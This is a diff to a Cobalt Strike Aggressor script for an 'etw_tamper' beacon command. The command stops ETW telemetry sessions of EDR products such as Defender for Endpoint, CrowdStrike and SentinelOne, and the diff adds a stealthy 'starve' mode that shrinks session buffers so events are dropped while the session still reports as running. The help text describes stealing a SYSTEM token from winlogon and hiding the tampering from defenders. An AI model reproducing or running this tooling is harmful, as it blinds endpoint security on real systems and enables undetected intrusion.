@@ -16,10 +16,12 @@
 # Usage:
 #   etw_tamper Microsoft-Windows-Sense;CrowdStrike-Falcon-Sensor   stop sessions
 #   etw_tamper query Microsoft-Windows-Sense                        check status
+#   etw_tamper starve Microsoft-Windows-Sense                       shrink buffers (stealthy)
 #   etw_tamper mde          shortcut: stop all MDE sessions
 #   etw_tamper crowdstrike  shortcut: stop CrowdStrike sessions
 #   etw_tamper sentinelone  shortcut: stop SentinelOne sessions
 #   etw_tamper all          shortcut: stop all known EDR sessions
+#   etw_tamper starve mde|crowdstrike|all   stealthy buffer starvation via vendor shortcut
 
 # Known EDR session sets
 sub _etw_sessions_for {
@@ -39,7 +41,7 @@ sub _etw_sessions_for {
 }
 
 alias etw_tamper {
-    local('$bof $args $bid $handle $path $mode $sessions $preset');
+    local('$bof $args $bid $handle $path $mode $sessions $preset $starve_mode');
     $bid  = $1;
     $path = script_resource("etw_tamper.x64.o");
 
@@ -58,35 +60,60 @@ alias etw_tamper {
 
     if (size(@_) == 1) {
         berror($bid, "[etw_tamper] Usage:\n" .
-            "  etw_tamper <sessions>              stop semicolon-separated sessions\n" .
-            "  etw_tamper query <sessions>        query session status\n" .
-            "  etw_tamper mde|crowdstrike|sentinelone|all   vendor shortcuts");
+            "  etw_tamper <sessions>                stop semicolon-separated sessions\n" .
+            "  etw_tamper query <sessions>          query session status\n" .
+            "  etw_tamper starve <sessions>         shrink buffers — stealth stop\n" .
+            "  etw_tamper mde|crowdstrike|sentinelone|all   vendor shortcuts\n" .
+            "  etw_tamper starve mde|crowdstrike|all         starve vendor sessions");
         return;
     }
 
-    # Check for vendor shortcuts
-    $preset = _etw_sessions_for($2);
-    if ($preset !is $null) {
-        $mode     = 0;
-        $sessions = $preset;
-        btask($bid, "ETW Tamper: stopping " . $2 . " sessions -> " . $sessions);
+    # starve subcommand — buffer starvation mode
+    $starve_mode = 0;
+    if ($2 eq "starve") {
+        $starve_mode = 1;
+        if (size(@_) >= 3) {
+            # Could be a vendor shortcut or direct session list
+            $preset = _etw_sessions_for($3);
+            if ($preset !is $null) {
+                $sessions = $preset;
+                btask($bid, "ETW Tamper: STARVING buffers for " . $3 . " sessions -> " . $sessions);
+            } else {
+                $sessions = $3;
+                btask($bid, "ETW Tamper: STARVING buffers -> " . $3);
+            }
+        } else {
+            # Default: starve all known EDR sessions
+            $sessions = "Microsoft-Windows-Sense;Microsoft-Windows-Threat-Intelligence;CrowdStrike-Falcon-Sensor;SentinelOne-Sensor";
+            btask($bid, "ETW Tamper: STARVING buffers for all known EDR sessions");
+        }
+        $mode = 2;
 
-    } else if ($2 eq "query" && size(@_) >= 3) {
-        $mode     = 1;
-        $sessions = $3;
-        btask($bid, "ETW Tamper: querying session status for -> " . $3);
-
-    } else if ($2 eq "query") {
-        # Query default set
-        $mode     = 1;
-        $sessions = "Microsoft-Windows-Sense;Microsoft-Windows-Threat-Intelligence;CrowdStrike-Falcon-Sensor;SentinelOne-Sensor";
-        btask($bid, "ETW Tamper: querying known EDR sessions");
-
+    # Check for vendor shortcuts (mode 0 = stop)
     } else {
-        # Stop specified sessions directly
-        $mode     = 0;
-        $sessions = $2;
-        btask($bid, "ETW Tamper: stopping sessions -> " . $2);
+        $preset = _etw_sessions_for($2);
+        if ($preset !is $null) {
+            $mode     = 0;
+            $sessions = $preset;
+            btask($bid, "ETW Tamper: stopping " . $2 . " sessions -> " . $sessions);
+
+        } else if ($2 eq "query" && size(@_) >= 3) {
+            $mode     = 1;
+            $sessions = $3;
+            btask($bid, "ETW Tamper: querying session status for -> " . $3);
+
+        } else if ($2 eq "query") {
+            # Query default set
+            $mode     = 1;
+            $sessions = "Microsoft-Windows-Sense;Microsoft-Windows-Threat-Intelligence;CrowdStrike-Falcon-Sensor;SentinelOne-Sensor";
+            btask($bid, "ETW Tamper: querying known EDR sessions");
+
+        } else {
+            # Stop specified sessions directly
+            $mode     = 0;
+            $sessions = $2;
+            btask($bid, "ETW Tamper: stopping sessions -> " . $2);
+        }
     }
 
     # i = int32 (mode), Z = null-terminated wide string (session list)
@@ -96,34 +123,41 @@ alias etw_tamper {
 
 beacon_command_register(
     "etw_tamper",
-    "Stop ETW sessions to blind EDR behavioral detection (steals SYSTEM token from winlogon)",
+    "Stop/starve ETW sessions to blind EDR behavioral detection (steals SYSTEM from winlogon)",
     "Usage:\n" .
     "  etw_tamper <sessions>              stop named ETW sessions (semicolon-separated)\n" .
     "  etw_tamper query [sessions]        query session status without stopping\n" .
+    "  etw_tamper starve [sessions]       shrink buffers to 8KB — stealth alternative to stop\n" .
     "  etw_tamper mde                     stop Microsoft Defender for Endpoint sessions\n" .
     "  etw_tamper crowdstrike             stop CrowdStrike Falcon sessions\n" .
     "  etw_tamper sentinelone             stop SentinelOne sessions\n" .
-    "  etw_tamper all                     stop all known EDR ETW sessions\n\n" .
+    "  etw_tamper all                     stop all known EDR ETW sessions\n" .
+    "  etw_tamper starve mde|crowdstrike|all   starve buffers for vendor preset\n\n" .
     "Examples:\n" .
     "  etw_tamper Microsoft-Windows-Sense;Microsoft-Windows-Threat-Intelligence\n" .
     "  etw_tamper query Microsoft-Windows-Sense\n" .
+    "  etw_tamper starve Microsoft-Windows-Sense\n" .
     "  etw_tamper mde\n" .
-    "  etw_tamper all\n\n" .
-    "Mechanism:\n" .
-    "  ControlTraceW(..., EVENT_TRACE_CONTROL_STOP) tears down the named ETW session.\n" .
-    "  EDR consumer receives ERROR_WMI_INSTANCE_NOT_FOUND -> stops receiving events.\n" .
-    "  Kernel providers (process create, network, file I/O) continue running but\n" .
-    "  events are dropped — no consumer to deliver them to.\n\n" .
+    "  etw_tamper starve all\n\n" .
+    "Modes:\n" .
+    "  MODE 0 (stop):  EVENT_TRACE_CONTROL_STOP — session torn down, 'Stopped' in logman.\n" .
+    "                  EDR consumer gets ERROR_WMI_INSTANCE_NOT_FOUND. Loud — detectable.\n\n" .
+    "  MODE 1 (query): EVENT_TRACE_CONTROL_QUERY — informational only, no changes.\n\n" .
+    "  MODE 2 (starve): EVENT_TRACE_CONTROL_UPDATE with BufferSize=4KB, MaxBuffers=2.\n" .
+    "                  Session stays 'Running' in logman — no stop event generated.\n" .
+    "                  Total buffer = 8KB. At EDR event rate, buffers fill in <1ms.\n" .
+    "                  Kernel silently drops events: STATUS_UNSUCCESSFUL from EtwpWriteUserEvent.\n" .
+    "                  Stealth: no session state change visible to defenders.\n\n" .
     "Token theft:\n" .
-    "  System ETW sessions require SYSTEM privilege to stop.\n" .
+    "  System ETW sessions require SYSTEM privilege.\n" .
     "  BOF automatically steals SYSTEM token from winlogon.exe (PID enumeration\n" .
     "  -> OpenProcess -> OpenProcessToken -> DuplicateToken -> SetThreadToken).\n" .
-    "  Thread token is reverted after ControlTrace calls complete.\n\n" .
+    "  Thread token reverted after ControlTrace calls complete.\n\n" .
     "High-value session names:\n" .
     "  Microsoft-Windows-Sense                  MDE kernel telemetry\n" .
-    "  Microsoft-Windows-Threat-Intelligence    ETW-TI (broad kernel events)\n" .
-    "  CrowdStrike-Falcon-Sensor                CS real-time collection\n" .
-    "  SentinelOne-Sensor                       S1 telemetry\n\n" .
+    "  Microsoft-Windows-Threat-Intelligence    ETW-TI (process/network/file/memory)\n" .
+    "  CrowdStrike-Falcon-Sensor                CS real-time event collection\n" .
+    "  SentinelOne-Sensor                       S1 telemetry pipeline\n\n" .
     "Requires: SYSTEM (obtained via winlogon token theft inside BOF)\n" .
     "Verify:   logman query | Select-String -Pattern 'Sense|Falcon|Sentinel'"
 );
